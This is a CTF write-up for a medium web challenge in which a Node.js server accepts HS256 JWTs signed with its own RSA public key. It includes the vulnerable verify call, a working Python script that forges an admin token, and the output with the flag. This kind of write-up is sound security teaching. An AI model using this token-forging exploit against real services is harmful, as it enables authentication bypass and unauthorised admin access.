---
title: "VaultBreaker Asset Management System"
ctf: "CyberStrike CTF"
date: 2026-07-10
category: web
difficulty: medium
points: 250
flag_format: "cyberstrike{...}"
author: "retr0"
---

# VaultBreaker Asset Management System

## Summary

A Node.js asset management platform authenticates users with JWTs signed using RSA (RS256). The server's `jsonwebtoken.verify()` call uses the RSA **public key** as the verification key without pinning the algorithm, so it happily accepts HS256 tokens that are HMAC-signed with that same public key. Fetching the exposed public key from `/api/public-key` and forging an admin HS256 JWT yields the flag from `/api/admin/secret`.

## Solution

### Step 1: Recon and grab the public key

The root endpoint advertises four routes. `/api/public-key` returns the RSA public key in PEM form; `/api/dashboard` and `/api/admin/secret` both require a Bearer JWT. Login (`POST /api/login`) rejects common credentials and SQL/NoSQL injection attempts — but we don't need a valid account, because the verification key is public.

```bash
curl -s http://chal.csc-snist.live:34757/api/public-key
```

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5DMJ9you1/rWdTr8VANo
ykWcI7fnIdO+k2UN2zd6bVtOJMIpNH1npdfpaUfEiw/P3SUOoxGQkg4hKz7rhc3j
Z1NPkrj7q0Em8eZ9Vgi7qWmoq3Mk0ZcCTNaDqo8saPZmoQiroUIqxyfwz5yKvEVF
gibRJfgMiqpkUssCyu+FOUDpAGtnlspOuYhCS5m7A1yH4+wpW5xtk571wGZGuilH
cpv6any0wrWq3dwbuEGtYCffrWYcdugmyAnFxIWZ46zK3Hs7It8O195goxzZyiYC
IUtJhkHs4qG+rE+nqmczGZBAZefL7QUMgfITRMWvb6o8/aOyNRQ6qrq1/RJ+cb0J
uwIDAQAB
-----END PUBLIC KEY-----
```

### Step 2: Forge an HS256 JWT signed with the public key

The vulnerable code pattern is:

```javascript
jwt.verify(token, publicKey); // no algorithm pinned
```

When the token header says `alg: HS256`, `jsonwebtoken` treats `publicKey` as an HMAC secret and validates the HMAC — which we can compute ourselves because we have the public key. PyJWT refuses to sign HS256 with an asymmetric key, so the token is built manually with `hmac`.

```python
import json, base64, hmac, hashlib, requests

BASE = "http://chal.csc-snist.live:34757"

pubkey_pem = requests.get(f"{BASE}/api/public-key").text

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def forge(payload, key_bytes):
    header = {"alg": "HS256", "typ": "JWT"}
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url(sig)}"

token = forge({"username": "admin", "role": "admin"}, pubkey_pem.encode())
print("Forged token:", token)

resp = requests.get(
    f"{BASE}/api/admin/secret",
    headers={"Authorization": f"Bearer {token}"},
)
print(resp.status_code, resp.text)
```

### Step 3: Retrieve the flag

```bash
python exploit.py
```

```
Forged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.YFxNDBNBATGCa1ljkpaLhCV3KlLywILqGL6_5V9_NJY
200 {"secret":"cyberstrike{2f1dcafcea0065dd6927d9f21b884990}"}
```

## Flag

```
cyberstrike{2f1dcafcea0065dd6927d9f21b884990}
```
